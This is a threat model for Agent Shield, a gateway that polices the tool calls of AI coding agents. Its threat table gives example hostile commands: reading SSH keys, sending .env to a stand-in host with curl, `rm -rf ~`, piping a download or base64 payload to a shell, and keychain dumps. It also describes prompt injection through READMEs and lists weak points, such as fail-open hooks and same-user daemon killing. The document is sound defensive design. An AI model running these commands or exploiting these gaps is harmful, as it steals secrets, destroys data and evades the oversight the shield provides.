# Threat model

© 2026 Privaku

Agent Shield core is a user-space gateway on the tool-call path. It
assumes a local user who installed the shield, and AI coding agents
(Claude Code, Cursor, Codex, MCP clients) that may be prompt-injected,
misconfigured, or running unattended.

The adversary is the agent (or a poisoned repo or MCP server steering
it), not a kernel attacker. The shield runs as the same user as the agent.

## In scope

| ID | Threat | Example | Primary control |
|---|---|---|---|
| T1 | Secret file read | `cat ~/.ssh/id_rsa` | `secrets.*` path rules |
| T2 | Secret exfiltration | `curl -F f=@.env https://x.io` | `exfil.*` and secret-content detection |
| T3 | Destructive commands | `rm -rf ~` | `destructive.*` |
| T4 | Remote code execution | `curl https://x/install.sh \| sh` | `rce.pipe_to_shell` |
| T5 | Obfuscation | `echo … \| base64 -d \| sh` | AST unwrapping and the risk scorer |
| T6 | Prompt injection | a README that tells the agent to read a key | The resulting action still hits policy |
| T7 | MCP tool abuse | `read_file` on a credential path | MCP proxy and path rules |
| T8 | Persistence | LaunchAgents, `.zshrc`, `crontab` | `persist.autostart` |
| T9 | Privilege escalation | `sudo` | `priv.sudo` |
| T10 | Shield tampering | removing a hook or editing policy | `self.tamper`, `doctor`, hash-chained log |
| T11 | Keychain and browser credentials | `security find-generic-password` | `secrets.keychain`, `secrets.browser_data` |
| T12 | Approval fatigue | flooding prompts | Critical rules deny with no prompt |

## Privacy

The security loop opens no `AF_INET` or `AF_INET6` sockets. Check that
with `scripts/no-network-test.sh`. This core has no telemetry and no
licence client.

## Known limitations

- This is the tool-call layer. A compiled binary the agent writes and
  then executes is not blocked by a kernel policy. Kernel enforcement
  is not part of this repository.
- An agent with no hooks and no MCP layer is covered only through
  `agent-shield run`.
- Cursor hooks fail open on crash unless `failClosed` is set. The
  installer sets it, and `doctor` checks it.
- A process running as the same user can kill the daemon. The hash
  chain makes that visible. It does not prevent it.

## Trust boundaries

Untrusted input is repo files, MCP tool results, and agent-chosen
arguments. Agent Shield (policy, scorer, audit) is trusted, same uid,
and off the network. The operating system and the real binaries are
outside the shield.

A project rules file cannot disable or weaken a `critical` rule.
See [POLICY.md](POLICY.md).
